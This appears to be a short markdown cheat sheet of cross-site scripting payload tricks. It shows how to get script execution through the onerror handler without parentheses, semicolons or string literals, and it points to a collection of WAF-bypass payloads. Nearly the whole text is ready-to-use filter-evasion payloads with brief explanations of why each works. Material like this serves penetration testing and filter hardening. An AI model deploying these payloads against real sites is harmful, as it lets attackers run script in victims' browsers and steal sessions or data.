# Tricks
## No Parentheses / Semicolons
- `<script>onerror=alert;throw 1337</script>`
	- Sets `onerror = alert`, then throws a custom exception (`1337`), which triggers `alert(1337)` via the error handler.
- `<script>{onerror=alert}throw 1337</script>`
	- Clever trick: the block wraps the assignment, letting you skip the trailing `;`.
- `<script>throw onerror=alert,'some string',123,'haha'</script>`
	- This works because the `throw` statement evaluates an expression,
	- `onerror=alert` sets the handler, and the **last expression** (`'haha'`) becomes the argument to `alert`.
- `<script>{onerror=eval}throw'=alert\x281337\x29'</script>`
	- Chrome interprets the thrown value as `"Uncaught=alert(1337)"`—which `eval` processes fine.
	- Firefox prefixes exceptions with `"uncaught exception"`, causing syntax issues.
		`<script>{onerror=eval}throw{lineNumber:1, columnNumber:1, fileName:1, message:'alert\x281\x29'}</script>`
## Without String Literals
- `<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>`
- `<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>`
	- Avoids `throw` altogether by forcing a type error and using property access
# Tools
- https://xss-payloads.paracyberbellum.io/payloads
	- WAF bypass payloads